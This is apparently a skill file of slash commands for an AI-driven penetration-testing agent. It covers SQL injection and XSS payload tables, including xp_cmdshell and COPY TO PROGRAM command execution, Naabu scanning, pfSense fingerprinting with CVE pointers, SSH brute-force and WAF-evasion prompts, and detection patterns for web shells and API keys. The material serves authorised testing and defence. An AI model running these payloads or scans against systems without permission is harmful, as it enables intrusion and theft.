# Security Commands

Slash commands for rapid security testing and reconnaissance.

## Available Commands

### /sqli-test

SQL injection testing assistant with payloads for different contexts.

**Usage:**
```
/sqli-test <target_url> [context]
```

**Payloads by Context:**

| Context | Payload |
|---------|---------|
| String-based | `' OR '1'='1' --` |
| Numeric | `1 OR 1=1 --` |
| UNION-based | `1 UNION SELECT NULL,username,password FROM users --` |
| Error-based | `1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --` |
| Blind boolean | `1' AND 1=1 --` / `1' AND 1=2 --` |
| Time-based | `1'; WAITFOR DELAY '0:0:5' --` |
| MSSQL | `'; EXEC xp_cmdshell('whoami') --` |
| PostgreSQL | `'; COPY (SELECT 'test') TO PROGRAM 'whoami' --` |

**Resources:**
- `security-payloads/sqli.txt` - Comprehensive SQLi payloads
- `security-fuzzing/` - Fuzzing wordlists

---

### /xss-test

XSS vulnerability testing with context-aware payloads.

**Usage:**
```
/xss-test <target_url> [context]
```

**Payloads by Context:**

| Context | Payload |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| Attribute | `" onmouseover="alert(1)` |
| JavaScript | `';alert(String.fromCharCode(88,83,83))//` |
| URL | `javascript:alert(1)` |
| DOM | `<img src=x onerror=alert(1)>` |
| SVG | `<svg onload=alert(1)>` |
| Polyglot | `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e` |

**Resources:**
- `security-payloads/xss.txt` - XSS payload list
- `security-fuzzing/` - Fuzzing wordlists

---

### /wordlist

Access SecLists wordlists for security testing.

**Usage:**
```
/wordlist <category> [subcategory]
```

**Categories:**

| Category | Subcategories |
|----------|---------------|
| `fuzzing` | `common-words`, `param-miner`, `api-endpoints` |
| `passwords` | `rockyou`, `xato`, `10k-most-common` |
| `payloads` | `sqli`, `xss`, `lfi`, `rce`, `xxe` |
| `patterns` | `api-keys`, `credentials`, `emails`, `ip-addresses` |
| `usernames` | `usernames`, `admin-panels`, `web-shells` |

**Example:**
```
/wordlist passwords 10k-most-common
/wordlist payloads sqli
/wordlist fuzzing api-endpoints
```

---

### /naabu-scan

Port scanning with Naabu for network reconnaissance.

**Usage:**
```
/naabu-scan <target> [options]
```

**Quick Commands:**
| Command | Description |
|---------|-------------|
| `naabu -host <target>` | Basic scan (top 100 ports) |
| `naabu -host <target> -p -` | Full port scan (1-65535) |
| `naabu -host <target> -p 80,443,8080` | Specific ports |
| `naabu -l hosts.txt` | Scan host list |
| `naabu -host <target> -j` | JSON output |
| `naabu -host <target> -ec` | Exclude CDN/WAF |
| `naabu -host <target> -sn` | Host discovery only |
| `naabu -host <target> -ss` | Smart scan (predictive) |
| `naabu -host <target> -passive` | Passive (Shodan) scan |
| `naabu -host <target> -s CONNECT` | CONNECT scan (no root) |

**Integration Workflows:**
```bash
# Naabu + httpx (web servers)
naabu -host target.com -silent | httpx -silent

# Naabu + nuclei (vulnerabilities)
naabu -host target.com -silent | httpx -silent | nuclei

# Naabu + subfinder (full recon)
subfinder -d target.com -silent | naabu -silent

# Naabu + nmap (service details)
naabu -host target.com -nmap-cli 'nmap -sV'
```

**Rate Limiting:**
```bash
# Adjust rate (packets/second)
naabu -host target.com -rate 500

# Stealth scan (slower)
naabu -host target.com -rate 100 -retries 1
```

---

### /webshell-detect

Defensive web shell detection using pattern matching and YARA rules.

**Usage:**
```
/webshell-detect <directory>
```

**Detection Methods:**

1. **Pattern Matching**
   - PHP: `eval()`, `base64_decode()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, `assert()`, `preg_replace()` with `/e` modifier
   - ASP: `eval`, `execute`, `wscript.shell`, `shell.application`
   - JSP: `Runtime.getRuntime().exec()`, `ProcessBuilder`

2. **YARA Rules**
   - Web shell signatures
   - Obfuscation patterns
   - Known malware families

3. **IOC Generation**
   - File hashes (MD5, SHA1, SHA256)
   - Network indicators
   - Behavioral patterns

**Resources:**
- `security-usernames/webshells/` - Web shell signatures
- `security-patterns/` - Detection patterns

---

### /api-keys

API key and secrets scanner for credential hunting.

**Usage:**
```
/api-keys <target> [--format json|csv]
```

**Patterns Detected:**

| Provider | Pattern Example |
|----------|-----------------|
| AWS | `AKIA[0-9A-Z]{16}` |
| GCP | `"type": "service_account"` |
| GitHub | `ghp_[a-zA-Z0-9]{36}` |
| Slack | `xox[baprs]-[0-9a-zA-Z]{10,48}` |
| Stripe | `sk_live_[0-9a-zA-Z]{24}` |
| Google API | `AIza[0-9a-zA-Z-_]{35}` |
| Azure | `[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}` |

**Scanning Targets:**
- Source code repositories
- Configuration files
- Environment variables
- Git history
- Docker images

**Resources:**
- `security-patterns/` - Regex patterns
- `security-fuzzing/` - Fuzzing wordlists

---

## Plugin Resources

This skill leverages the following SecLists categories:

| Resource | Purpose |
|----------|---------|
| `security-fuzzing/` | Fuzzing wordlists for web testing |
| `security-passwords/` | Password wordlists for brute force |
| `security-payloads/` | Attack payloads (SQLi, XSS, etc.) |
| `security-patterns/` | Regex patterns for detection |
| `security-usernames/` | Username lists for enumeration |

---

## 🔥 pfSense Detection & Routing

> **IMPORTANTE:** Se durante o uso dos comandos de segurança você identificar **pfSense**, **CONSULTE A SKILL `pentest-pfsense`** imediatamente.

### Detecção Rápida com Comandos

```bash
# /naabu-scan + detecção pfSense
naabu -host <target> -p 443,22 -silent | while read port; do
    curl -skI https://<target> | grep -iE "server:|pfsense"
done

# Web GUI fingerprint
curl -sk https://<target>/ | grep -iE "pfSense|Netgate|login_button"

# Version detection
curl -sk https://<target>/ | grep -iE "version|2\.[0-9]"
```

### Sinais de Alerta

- [ ] Porta 443 com nginx e título "pfSense Login"
- [ ] Porta 22 com OpenSSH
- [ ] Portas 1194 (OpenVPN), 500/4500 (IPSec), 51820 (WireGuard)
- [ ] Certificado SSL com CN=pfSense
- [ ] XMLRPC endpoint disponível

### Ação Imediata

```bash
# Se pfSense detectado → ATIVAR pentest-pfsense skill
# Use pentest-pfsense para:
# - CVE verification específica
# - Command injection testing (CVE-2023-42326)
# - File read testing (CVE-2025-53392)
# - Package vulnerabilities (pfBlockerNG, Suricata, Snort)
```

---

## 🤖 AIRecon Integration for Security Commands

> **NOTE:** AIRecon can execute all slash commands and provides additional automation, workflow orchestration, and result consolidation.

### AIRecon Invocation for Security Commands

```bash
# SQL injection testing
airecon "test SQL injection on https://target.com/login.php"

# XSS testing
airecon "test XSS vulnerabilities on https://target.com/search"

# Port scanning
airecon "scan target.com for open ports"

# Webshell detection
airecon "scan /var/www/html for webshells"

# API key scanning
airecon "scan repository for exposed API keys and secrets"

# Wordlist access
airecon "get password wordlist for brute force testing"
```

### Slash Command Mapping to AIRecon

| Slash Command | AIRecon Equivalent | Additional Capabilities |
|---------------|-------------------|------------------------|
| `/sqli-test <url>` | `airecon "SQL injection test <url>"` | Auto-detect DB type, generate context-aware payloads |
| `/xss-test <url>` | `airecon "XSS test <url>"` | DOM testing, polyglot payloads, blind XSS |
| `/wordlist <cat>` | `airecon "get <cat> wordlist"` | Custom wordlist generation, context-aware filtering |
| `/naabu-scan <target>` | `airecon "port scan <target>"` | Multi-tool scan (Naabu + Masscan + Nmap) |
| `/webshell-detect <dir>` | `airecon "webshell scan <dir>"` | YARA rules, ML-based detection, IOC generation |
| `/api-keys <target>` | `airecon "secret scan <target>"` | Git history, Docker images, cloud secrets |

### MCP Tool Integration for Security Commands

```bash
# Use hexstrike-local for SQL injection testing
airecon "run SQLMap scan on https://target.com"

# Use hexstrike-local for XSS testing
airecon "run Dalfox XSS scan on https://target.com"

# Use hexstrike-local for port scanning
airecon "run RustScan fast port scan on target.com"

# Use hexstrike-local for vulnerability scanning
airecon "run Nuclei vulnerability scan on target.com"

# Use hexstrike-local for secret detection
airecon "scan GitHub repo for exposed secrets"
```

### Workflow: AIRecon Multi-Command Automation

```bash
# Full web application security assessment
airecon "run security assessment on https://target.com including SQLi, XSS, and secret scanning"

# AIRecon will execute:
# 1. /naabu-scan for port discovery
# 2. /sqli-test on identified forms
# 3. /xss-test on input fields
# 4. /api-keys scan on source code
# 5. Consolidate findings into unified report
```

### Auto-Skill Loading for Security Command Keywords

| Keywords | Skills Loaded | MCP Tools |
|----------|---------------|-----------|
| `sqli`, `SQL injection`, `sqlmap` | `security-commands.md`, `pentest-vulnerability-analysis.md` | `hexstrike-local` (sqlmap_scan) |
| `xss`, `cross-site scripting`, `dalfox` | `security-commands.md`, `pentest-vulnerability-analysis.md` | `hexstrike-local` (dalfox_xss_scan, xsser_scan) |
| `port scan`, `naabu`, `nmap` | `security-commands.md`, `pentest-network-scanning.md` | `hexstrike-local` (nmap_scan, rustscan_fast_scan, naabu_scan) |
| `webshell`, `backdoor`, `malware` | `security-commands.md`, `pentest-post-exploitation.md` | `hexstrike-local` (strings_extract, exiftool_extract) |
| `api-key`, `secret`, `credential` | `security-commands.md`, `pentest-post-exploitation.md` | `hexstrike-local` (scan_repo_secrets via cve-mcp) |
| `wordlist`, `password`, `brute` | `security-commands.md`, `pentest-exploitation.md` | `hexstrike-local` (hydra_attack, hashcat_crack) |

### AIRecon Command Chaining

```bash
# Chain multiple security commands
airecon "scan target.com with naabu, then test discovered web services for SQLi and XSS"

# Conditional execution
airecon "if port 443 open, run SSL vulnerability scan; if port 22 open, run SSH brute force test"

# Parallel execution
airecon "run SQLi test, XSS test, and secret scan in parallel on target.com"
```

### AIRecon Result Consolidation

```bash
# Consolidate findings from multiple commands
airecon "consolidate results from sqli-test, xss-test, and api-keys scan into single report"

# Generate unified vulnerability report
airecon "generate unified report from all security command results"

# Export to SIEM format
airecon "export security findings to SARIF format for GitHub Security"
```

### Error Handling and Retry Logic

```bash
# If SQLi test times out
airecon "SQLi test target.com --timeout 30 --retry 3"

# If rate limited during scanning
airecon "scan target.com --rate-limit 100 --delay 1000ms"

# If WAF detected
airecon "scan target.com --waf-evasion --bypass-techniques"
```

### AIRecon Enhanced Output

```bash
# JSON output for automation
airecon "security scan target.com --output json"

# Markdown report for documentation
airecon "security scan target.com --output markdown"

# Interactive dashboard
airecon "security scan target.com --dashboard"
```

---

## Ethical Considerations

- Only use on systems you own or have explicit permission to test
- Document all findings responsibly
- Follow responsible disclosure practices
- Respect scope and rules of engagement
